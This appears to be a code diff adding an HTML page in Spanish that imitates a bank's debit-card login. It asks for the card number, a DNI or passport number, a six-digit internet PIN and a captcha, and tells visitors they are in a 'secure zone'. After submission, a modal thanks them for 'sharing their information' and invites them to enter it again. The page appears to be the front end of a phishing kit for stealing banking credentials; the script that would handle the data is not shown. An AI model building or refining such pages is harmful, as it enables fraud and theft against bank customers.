@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página Web</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="header">
+        <img src="Imagenes/logo.png" alt="Logo" class="logo-left">
+        <img src="Imagenes/logoA.png" alt="LogoA" class="logo-right">
+    </div>
+    <div class="container">
+        <div class="content">
+            <div class="form">
+                <p class="security-text">Se Encuentra en una Zona Segura</p>
+                <label for="cardType">Seleccion:</label>
+                <select name="cardType" id="cardType">
+                    <option value="Multired global debito">Multired global debito</option>
+                    <option value="Electronico debito">Electronico debito</option>
+                    <option value="Monedero debito">Monedero debito</option>
+                    <option value="debito">debito</option>
+                    <option value="otros">otros</option>
+                </select>
+                <label for="cardNumber">Numero de targeta:</label>
+                <input type="text" id="cardNumber" maxlength="16">
+                <label for="documentType">Tipo de documento:</label>
+                <select name="documentType" id="documentType">
+                    <option value="DNI">DNI</option>
+                    <option value="Pasaporte">Pasaporte</option>
+                </select>
+                <input type="text" id="documentNumber" maxlength="12" placeholder="Número de documento">
+                <label for="internetKey">Generar tu clave por internet (solo hasta 6 dígitos):</label>
+                <input type="password" id="internetKey" maxlength="6" placeholder="Ingresa tu clave de internet" readonly>
+                <div class="virtual-keyboard">
+                    <!-- Teclado virtual -->
+                </div>
+                <label for="captcha">Ingresar captcha:</label>
+                <div class="captcha-row">
+                    <div class="captcha">
+                        <!-- Captcha -->
+                    </div>
+                    <button id="captchaRefreshButton">Refrescar</button>
+                </div>
+                <input type="text" id="captchaInput" placeholder="Ingresa el captcha">
+                <button id="submitButton">Ingresar</button>
+            </div>
+        </div>
+    </div>
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <p>Tus datos fueron registrados. Gracias por compartir tu información.</p>
+            <button id="reloadButton">Volver a cargar datos</button>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
